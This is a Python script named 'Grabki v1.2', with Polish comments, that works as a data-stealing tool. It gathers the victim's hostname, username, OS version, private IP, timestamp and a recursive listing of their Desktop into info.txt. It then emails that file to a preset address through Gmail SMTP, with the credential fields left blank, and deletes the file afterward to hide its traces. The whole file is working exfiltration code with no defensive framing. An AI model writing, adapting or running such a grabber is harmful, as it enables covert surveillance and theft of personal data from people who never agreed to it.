import smtplib
import datetime
import platform
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket
import os
import getpass

# Tytuł
tytul = "Grabki v1.2"
tytul_pole = 'title {}'.format(tytul)
os.system(tytul_pole)

# Pobieranie prywatnego IP
def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

# Listowanie pulpitu
def list_files_on_desktop(folder_path, indent=""):
    result = ""
    items = os.listdir(folder_path)
    for item in items:
        item_path = os.path.join(folder_path, item)
        if os.path.isdir(item_path):
            result += indent + "Folder: " + item + "\n"
            result += list_files_on_desktop(item_path, indent + "  ")
        else:
            result += indent + "Plik: " + item + "\n"
    return result


desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
listing_result = list_files_on_desktop(desktop_path)

# Zmienne info
system = platform.system()
wersja_systemu = platform.version()
host = socket.gethostname()
ip = get_ip()
nazwa_uzy = getpass.getuser()
czas = datetime.datetime.now()
godzina = czas.strftime("%H:%M")
data = czas.strftime("%d-%m-%Y")


# Plik txt
with open("info.txt", "w", encoding="utf-8") as file:
    file.write(f"============Info============\n")
    file.write("Nazwa urządzenia: "f"{host}\n")
    file.write("Nazwa użytkownika: "f"{nazwa_uzy}\n")
    file.write("System operacyjny: "f"{system}\n")
    file.write("Wersja systemu: "f"{wersja_systemu}\n")
    file.write("Prywatny adres IP: "f"{ip}\n")
    file.write("Data: "f"{data}\n")
    file.write("Godzina: "f"{godzina}\n")
    file.write(f"============================\n")
    file.write(f"===========Pulpit===========\n")
    file.write(f"{listing_result}\n") # zbiera informacje z pulpitu (pliki i foldery)
    file.write(f"============================\n")

# Mail
def send_email():
    email = '' # Mail z którego będzie wszystko wysyłane
    password = '' # dedykowane hasło dla konta
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = '' # Mail do którego mają zostać dostarczone informacje
    msg['Subject'] = 'Grabki'
    body = "Grabki v1.2"
    msg.attach(MIMEText(body, 'plain'))
    filename = 'info.txt'
    attachment = open(filename, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= " + filename)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    text = msg.as_string()
    server.sendmail(email, '', text) # Jeszcze raz mail do którego ma zostać wszystko dostarczone
    server.quit()

send_email()
os.remove('info.txt')
